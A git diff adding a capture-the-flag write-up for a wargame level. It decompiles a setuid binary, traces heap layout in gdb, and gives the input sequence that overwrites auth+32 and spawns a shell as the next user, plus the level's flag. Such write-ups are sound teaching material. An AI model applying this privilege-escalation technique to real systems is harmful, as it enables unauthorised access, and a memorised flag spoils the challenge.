@@ -1,16 +1,165 @@
+# Level 8
 
+## General Informations 
 
-0x804a008:	0x41414141	0x41414141	0x41414141	0x00000011
-0x804a018:	0x4141000a	0x41414141	0x00000a41	0x00000011
-0x804a028:	0x0000000a	0x00000000	0x00000000	0x41414121
+**Path** : `/home/user/level8/level8` </br>
+**File** : 
+```
+level8: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3067a180acabc94d328ab89f0a5a914688bf67ab, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8`
 
+## Static Analysis
 
-=> To execute the shell inside the login command we need to have the address (auth + 32 != 0)
-=> So we launch the auth command to create a heap address
-=> After we execute the service command to strdup a long string in the heap and modify the value at auth + 32
-=> We lauch login and it will execute the shell
+After decompiling the binary and understandint it, we get the pseudo code below: 
 
-auth
-service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-login 
+```
+int main(void) {
+	int comparison_result;
+	char *input_buffer;
+	char *auth = NULL;
+	char *service = NULL;
 
+	while (1) {
+		printf("%p, %p \n", auth, service);
+		char *input = fgets((char *)input_buffer, 0x80, stdin);
+		if (input == NULL) {
+			return 0;
+		}
+
+		comparison_result = strncmp(input_buffer, "auth ", 5);
+		if (comparison_result == 0) {
+			auth = (char *)malloc(4);
+			if (auth == NULL) {
+				continue;
+			}
+			memset(auth, 0, 4);
+			if (strlen(input_buffer + 5) < 0x1f) {
+				strcpy(auth, input_buffer + 5);
+			}
+		}
+
+		comparison_result = strncmp(input_buffer, "reset", 5);
+		if (comparison_result == 0) {
+			if (auth != NULL) {
+				free(auth);
+				auth = NULL;
+			}
+		}
+
+		comparison_result = strncmp(input_buffer, "service", 7);
+		if (comparison_result == 0) {
+			service = strdup(input_buffer + 7);
+		}
+
+		comparison_result = strncmp(input_buffer, "login", 5);
+		if (comparison_result == 0) {
+			if (auth != NULL && *(int *)(auth + 0x20) == 0) {
+				fwrite("Password:\n", 1, 10, stdout);
+			} else {
+				system("/bin/sh");
+			}
+		}
+	}
+}
+```
+
+- `main`, the logic runs in an infinite while loop. The user input is compared to a list of options (auth, reset, service, and login).
+	- `auth`: allocates a buffer of 4 bytes. If the number of characters is less than 31, then the characters are copied into the heap.
+	- `reset`: frees auth and sets it to NULL.
+	- `service`: copies the characters following the command into a new allocated buffer in the heap.
+	- `login`: if auth is allocated and the value at `auth + 32` is different from 0, then a shell is launched.
+
+## Vulnerability found 
+
+This time, the vulnerability lies in the code implementation, by using the differents options in a precise way.
+
+## Dynamic Analysis
+
+Let's try the strategy from the static analysis, we place a breakpoint at the `fgets` call:
+```
+(gdb) b *0x080485ae
+...
+(gdb) c
+Continuing.
+auth 
+0x804a008, (nil) 
+```
+The `auth` command allocates spaces in the heap to `0x804a008`.
+
+```
+(gdb) x/10x 0x804a008
+0x804a008:	0x0000000a	0x00000000	0x00000000	0x00020ff1
+0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a028:	0x00000000	0x00000000
+(gdb) x 0x804a008 + 32
+0x804a028:	0x00000000
+```
+
+Our objective is to have a non-null value at `auth + 32 = 0x804a028`.
+Let's continue with the `service` command followed by 10 characters:
+```
+(gdb) c
+Continuing.
+serviceAAAAAAAAAA
+0x804a008, 0x804a018 
+...
+(gdb) x/10x 0x804a008
+0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
+0x804a018:	0x41414141	0x41414141	0x000a4141	0x00020fe1
+0x804a028:	0x00000000	0x00000000
+```
+
+The `service` buffer begins at the address `0x804a018`, we need ` 0x804a028 - 0x804a018 = 0x10 - 16 characters` to modify the correct value.
+
+```
+(gdb) c
+Continuing.
+serviceAAAAAAAAAAAAAAAA
+...
+(gdb) x/10x 0x804a008
+0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000019
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a028:	0x0000000a	0x00020fd9
+...
+(gdb) c
+Continuing.
+login
+$ whoami
+level8
+```
+
+This time the address holds the value `0xa`. We continue the execution with the `login` command and a shell spawns. Everything worked perfectly!
+> We are not the level9 user because the program was launched in the GDB environment.
+
+## Payload construction 
+
+The instructions are:
+- `auth `, to initialize the first address in the heap
+- `serviceAAAAAAAAAAAAAAAA`, `service` followed by 16 characters to access and modify the value at `auth + 32`
+- `login`, to spawn the shell
+```
+auth 
+serviceAAAAAAAAAAAAAAAA
+login
+```
+
+## Demonstration 
+
+```
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+serviceAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018 
+login
+$ whoami
+level9
+```
+
+## Flag 
+
+```
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
